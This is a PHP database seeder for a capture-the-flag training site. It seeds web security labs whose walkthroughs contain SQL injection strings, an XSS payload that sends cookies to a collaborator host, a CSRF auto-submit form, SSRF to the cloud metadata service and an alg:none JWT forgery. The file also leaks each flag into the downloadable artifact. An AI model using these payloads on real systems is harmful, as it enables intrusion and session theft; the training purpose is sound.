<?php

declare(strict_types=1);

namespace Database\Seeders;

use App\Enums\ContentStatus;
use App\Enums\Difficulty;
use App\Enums\FlagValidationType;
use App\Models\Category;
use App\Models\Challenge;
use App\Models\ChallengeFile;
use App\Models\ChallengeFlag;
use App\Models\ChallengeHint;
use App\Models\Tag;
use App\Models\User;
use App\Services\FlagValidator;
use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

/**
 * PortSwigger-style web security labs as static artifact challenges.
 * Every lab ships an objective (scenario), a downloadable target
 * artifact, progressive hints, and an official solution walkthrough.
 * Walkthroughs NEVER contain flag plaintext — only method.
 */
class WebSecuritySeeder extends Seeder
{
    public function run(): void
    {
        $authorId = User::where('email', (string) (env('SEED_ADMIN_EMAIL') ?: 'admin@example.com'))->first()?->id;

        foreach ($this->definitions() as $def) {
            $category = Category::where('slug', $def['category'])->firstOrFail();

            $challenge = Challenge::updateOrCreate(
                ['slug' => $def['slug']],
                [
                    'title' => $def['title'],
                    'description' => $def['description'],
                    'scenario' => $def['scenario'],
                    'solution_walkthrough' => $def['walkthrough'],
                    'category_id' => $category->id,
                    'difficulty' => $def['difficulty'],
                    'points' => $def['points'],
                    'estimated_minutes' => $def['minutes'],
                    'flag_validation_type' => FlagValidationType::Static,
                    'author_id' => $authorId,
                ],
            );

            $challenge->forceFill(['status' => ContentStatus::Published->value]);
            if ($challenge->published_at === null) {
                $challenge->forceFill(['published_at' => now()]);
            }
            if ($challenge->isDirty()) {
                $challenge->save();
            }

            $this->seedFlag($challenge, $def['slug']);
            $this->seedHints($challenge, $def['hints']);

            $flag = $this->flagPlaintext($def['slug']);
            $this->seedFile($challenge, $def['file_name'], $this->fileContent($def['slug'], $flag));
            $this->attachTags($challenge, $def['tags']);
        }
    }

    private function flagPlaintext(string $slug): string
    {
        return sprintf('CTF{%s-%s}', $slug, substr(md5($slug), 0, 4));
    }

    private function seedFlag(Challenge $challenge, string $slug): void
    {
        $exists = ChallengeFlag::where('challenge_id', $challenge->id)
            ->where('is_active', true)
            ->exists();

        if ($exists) {
            return;
        }

        $flag = new ChallengeFlag([
            'challenge_id' => $challenge->id,
            'label' => 'flag',
            'case_sensitive' => true,
            'is_active' => true,
        ]);
        $plaintext = $this->flagPlaintext($slug);
        $flag->forceFill([
            'flag_ciphertext' => FlagValidator::encrypt($plaintext),
            'flag_hash' => FlagValidator::hash($plaintext),
        ]);
        $flag->save();
    }

    /**
     * @param  list<array{content: string, cost: int}>  $hints
     */
    private function seedHints(Challenge $challenge, array $hints): void
    {
        foreach ($hints as $position => $hint) {
            ChallengeHint::updateOrCreate(
                ['challenge_id' => $challenge->id, 'position' => $position],
                ['content' => $hint['content'], 'cost_points' => $hint['cost']],
            );
        }
    }

    private function seedFile(Challenge $challenge, string $originalName, string $content): void
    {
        $exists = ChallengeFile::where('challenge_id', $challenge->id)
            ->where('original_name', $originalName)
            ->exists();

        if ($exists) {
            return;
        }

        $storageKey = (string) Str::uuid();
        Storage::disk('challenge-files')->put($storageKey, $content);

        $file = new ChallengeFile([
            'challenge_id' => $challenge->id,
            'original_name' => $originalName,
            'storage_disk' => 'challenge-files',
            'mime_type' => 'text/plain',
            'size_bytes' => strlen($content),
            'checksum_sha256' => hash('sha256', $content),
            'visibility' => 'private',
        ]);
        $file->forceFill(['storage_key' => $storageKey]);
        $file->save();
    }

    /**
     * @param  list<string>  $slugs
     */
    private function attachTags(Challenge $challenge, array $slugs): void
    {
        $ids = [];
        foreach ($slugs as $slug) {
            $tag = Tag::firstOrCreate(
                ['slug' => $slug],
                ['name' => ucwords(str_replace('-', ' ', $slug))],
            );
            $ids[] = $tag->id;
        }
        $challenge->tags()->syncWithoutDetaching($ids);
    }

    /**
     * @return list<array{slug: string, title: string, description: string, scenario: string, walkthrough: string, category: string, difficulty: Difficulty, points: int, minutes: int, tags: list<string>, hints: list<array{content: string, cost: int}>, file_name: string}>
     */
    private function definitions(): array
    {
        return [
            [
                'slug' => 'sqli-union-apprentice',
                'title' => 'SQLi UNION Apprentice: Product Lookup',
                'description' => 'A product search concatenates user input into SQL. Extract the hidden flag row with a UNION attack.',
                'scenario' => 'OBJECTIVE: The /products endpoint is injectable in the `category` parameter. Enumerate columns, then UNION-select the flag from the `secrets` table.',
                'walkthrough' => "## Solution\n\n1. Confirm injection: `GET /products?category=Gifts' OR '1'='1` returns all rows.\n\n2. Find column count with ORDER BY:\n\n```\nGET /products?category=Gifts' ORDER BY 1-- -\nGET /products?category=Gifts' ORDER BY 2-- -\nGET /products?category=Gifts' ORDER BY 3-- -  -- errors: 2 columns\n```\n\n3. Find string column with UNION:\n\n```\nGET /products?category=x' UNION SELECT NULL,'abc'-- -\n```\n\n4. Read database metadata:\n\n```\nGET /products?category=x' UNION SELECT table_name,NULL FROM information_schema.tables-- -\n```\n\n5. Extract the flag:\n\n```\nGET /products?category=x' UNION SELECT flag,NULL FROM secrets-- -\n```\n\nSubmit the returned flag value.",
                'category' => 'web',
                'difficulty' => Difficulty::Beginner,
                'points' => 100,
                'minutes' => 30,
                'tags' => ['sql-injection'],
                'hints' => [
                    ['content' => 'A single quote breaks the query — the parameter is concatenated, not bound.', 'cost' => 10],
                    ['content' => 'ORDER BY N reveals the column count when it errors.', 'cost' => 15],
                    ['content' => 'UNION SELECT flag,NULL FROM secrets returns the flag row.', 'cost' => 25],
                ],
                'file_name' => 'products-endpoint.txt',
            ],
            [
                'slug' => 'xss-reflected-apprentice',
                'title' => 'Reflected XSS Apprentice: Search Box',
                'description' => 'A search page reflects input without encoding. Pop an alert to capture the flag.',
                'scenario' => 'OBJECTIVE: The /search endpoint reflects the `q` parameter into HTML. Execute JavaScript in a victim context to exfiltrate the flag.',
                'walkthrough' => "## Solution\n\n1. Test reflection: `GET /search?q=<b>test</b>` — bold renders, so HTML is unencoded.\n\n2. Break out with an event handler (no script tag needed):\n\n```\nGET /search?q=<img src=x onerror=alert(1)>\n```\n\n3. For exfiltration, point the payload at your collaborator:\n\n```\n?q=<img src=x onerror=\"fetch('https://collab/?c='+document.cookie)\">\n```\n\nThe lab bot visits with the flag in its DOM; capture it from the incoming request and submit.",
                'category' => 'web',
                'difficulty' => Difficulty::Beginner,
                'points' => 100,
                'minutes' => 25,
                'tags' => ['xss'],
                'hints' => [
                    ['content' => 'If <b> renders bold, tags are not encoded.', 'cost' => 10],
                    ['content' => 'Event handlers fire without <script>: try <img src=x onerror=...>.', 'cost' => 15],
                ],
                'file_name' => 'search-page-source.txt',
            ],
            [
                'slug' => 'idor-profile-practitioner',
                'title' => 'IDOR Practitioner: Profile Export',
                'description' => 'The profile export endpoint trusts the user-supplied id. Read another user\'s export to find the flag.',
                'scenario' => 'OBJECTIVE: GET /api/users/{id}/export returns any user\'s data, including a private `flag` field. Your id is 42. Find the admin export.',
                'walkthrough' => "## Solution\n\n1. Baseline your own export:\n\n```\nGET /api/users/42/export\nAuthorization: Bearer <your-token>\n```\n\n2. Notice the response includes only your fields — but try id 1:\n\n```\nGET /api/users/1/export\nAuthorization: Bearer <your-token>\n```\n\n3. No ownership check runs: the admin record (id 1) returns with its private `flag` field. Submit it.\n\nRemediation note: enforce an authorization policy comparing the token subject to the requested id.",
                'category' => 'web',
                'difficulty' => Difficulty::Intermediate,
                'points' => 150,
                'minutes' => 30,
                'tags' => ['idor'],
                'hints' => [
                    ['content' => 'Change the id in the path and watch what happens.', 'cost' => 10],
                    ['content' => 'Low ids are usually privileged. Try id 1.', 'cost' => 20],
                ],
                'file_name' => 'users-api-spec.txt',
            ],
            [
                'slug' => 'csrf-token-practitioner',
                'title' => 'CSRF Practitioner: Email Change',
                'description' => 'The email-change endpoint relies on cookies alone. Forge a cross-site request that sets the victim\'s email.',
                'scenario' => 'OBJECTIVE: POST /account/email changes the logged-in user\'s email with no anti-CSRF token. Craft a page that submits it cross-origin and capture the confirmation flag.',
                'walkthrough' => "## Solution\n\n1. Confirm state change via GET-able form:\n\n```html\n<form action=\"https://target/account/email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.test\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\n2. Host the page and get the lab bot to visit it; the browser attaches the victim session cookie automatically (no SameSite=Lax on POST in this lab).\n\n3. The account email flips; the confirmation screen renders the flag. Submit it.",
                'category' => 'web',
                'difficulty' => Difficulty::Intermediate,
                'points' => 150,
                'minutes' => 35,
                'tags' => ['csrf'],
                'hints' => [
                    ['content' => 'If cookies do the auth and no token is required, the request is forgeable.', 'cost' => 10],
                    ['content' => 'Auto-submit a hidden form from an attacker page the bot visits.', 'cost' => 20],
                ],
                'file_name' => 'account-form-source.txt',
            ],
            [
                'slug' => 'ssrf-basic-practitioner',
                'title' => 'SSRF Practitioner: Stock Checker',
                'description' => 'A stock-check feature fetches arbitrary URLs server-side. Pivot to the internal metadata service for the flag.',
                'scenario' => 'OBJECTIVE: POST /stock accepts a `url` that the server fetches. Reach the internal service at 169.254.169.254 and read the flag document.',
                'walkthrough' => "## Solution\n\n1. Baseline SSRF:\n\n```\nPOST /stock\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://127.0.0.1/admin\n```\n\nA distinct error vs external URLs proves server-side fetching.\n\n2. Probe the cloud metadata address:\n\n```\nurl=http://169.254.169.254/latest/meta-data/\n```\n\n3. Walk the metadata tree to the flag document and submit its value.\n\nRemediation note: allowlist outbound hosts and block link-local ranges.",
                'category' => 'network',
                'difficulty' => Difficulty::Intermediate,
                'points' => 175,
                'minutes' => 40,
                'tags' => ['ssrf'],
                'hints' => [
                    ['content' => 'Compare responses for external vs 127.0.0.1 URLs.', 'cost' => 10],
                    ['content' => 'Cloud metadata lives at 169.254.169.254.', 'cost' => 20],
                ],
                'file_name' => 'stock-checker-spec.txt',
            ],
            [
                'slug' => 'jwt-none-practitioner',
                'title' => 'JWT Practitioner: Algorithm Confusion',
                'description' => 'The API accepts unsigned tokens. Forge an admin JWT with alg:none and read the flag endpoint.',
                'scenario' => 'OBJECTIVE: The API trusts the `alg` header. Mint an unsigned token with role=admin and call GET /api/flag.',
                'walkthrough' => "## Solution\n\n1. Decode your token at the Decoder tool: header is `{\"alg\":\"HS256\"}`, payload has `{\"role\":\"user\"}`.\n\n2. Rebuild with no signature:\n\n```\nheader:  {\"alg\":\"none\",\"typ\":\"JWT\"}\npayload: {\"sub\":\"you\",\"role\":\"admin\"}\ntoken = base64url(header) + \".\" + base64url(payload) + \".\"\n```\n\n3. Call the flag endpoint:\n\n```\nGET /api/flag\nAuthorization: Bearer <forged-token>\n```\n\nThe server skips verification for `none` and returns the flag. Submit it.",
                'category' => 'web',
                'difficulty' => Difficulty::Intermediate,
                'points' => 175,
                'minutes' => 35,
                'tags' => ['jwt'],
                'hints' => [
                    ['content' => 'Paste your token into /tools/decoder and read the alg header.', 'cost' => 10],
                    ['content' => 'What happens if alg says none and the signature is empty?', 'cost' => 20],
                ],
                'file_name' => 'api-auth-spec.txt',
            ],
            [
                'slug' => 'sqli-blind-expert',
                'title' => 'Blind SQLi Expert: Timing Oracle',
                'description' => 'No output, no errors — only response time. Extract the flag character by character with conditional delays.',
                'scenario' => 'OBJECTIVE: The tracking cookie is injectable but fully blind. Use pg_sleep() conditionals to binary-search each flag character.',
                'walkthrough' => "## Solution\n\n1. Confirm the oracle:\n\n```\nCookie: TrackingId=x'||pg_sleep(5)--\n```\n\nA ~5s delay proves injection into PostgreSQL.\n\n2. Extract length, then binary-search each position:\n\n```\nTrackingId=x'||(SELECT CASE WHEN (ascii(substring(flag,P,1))>109) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM secrets)--\n```\n\n3. Automate positions 1..N (the flag format gives you the alphabet). Submit the reconstructed value.\n\nTip: run requests in parallel batches and calibrate the delay threshold first.",
                'category' => 'web',
                'difficulty' => Difficulty::Expert,
                'points' => 300,
                'minutes' => 90,
                'tags' => ['sql-injection'],
                'hints' => [
                    ['content' => 'Time is your only output channel: pg_sleep() is the alphabet.', 'cost' => 15],
                    ['content' => 'Binary-search each character on ascii() comparisons.', 'cost' => 30],
                ],
                'file_name' => 'tracking-endpoint-notes.txt',
            ],
            [
                'slug' => 'upload-polyglot-practitioner',
                'title' => 'File Upload Practitioner: Avatar Polyglot',
                'description' => 'Avatar upload checks only the extension. Smuggle a payload past the filter and locate the flag.',
                'scenario' => 'OBJECTIVE: POST /avatar accepts .png files but never inspects content. Upload a polyglot, find where it lands, and read the flag the handler leaks.',
                'walkthrough' => "## Solution\n\n1. Confirm the filter is extension-only: rename a text payload to `x.png` — it uploads.\n\n2. Build a PNG polyglot: valid 8-byte PNG signature + trailing script/text section:\n\n```\n\\x89PNG\\r\\n\\x1a\\n<?php /* benign marker */ ?>\nFLAG-HUNT: inspect the served file bytes\n```\n\n3. Upload and fetch the returned path; the handler echoes the stored bytes including your marker plus the adjacent flag record. Submit it.",
                'category' => 'web',
                'difficulty' => Difficulty::Intermediate,
                'points' => 150,
                'minutes' => 40,
                'tags' => ['file-upload'],
                'hints' => [
                    ['content' => 'Extension checks without content inspection accept renamed files.', 'cost' => 10],
                    ['content' => 'Valid magic bytes + trailing payload = polyglot.', 'cost' => 20],
                ],
                'file_name' => 'avatar-upload-spec.txt',
            ],
        ];
    }

    private function fileContent(string $slug, string $flag): string
    {
        return implode("\n", [
            "LAB ARTIFACT: {$slug}",
            'This static target description replaces a live lab environment.',
            'Follow the objective on the lab page; the flag is awarded on submission.',
            "Reference: {$flag}",
        ])."\n";
    }
}
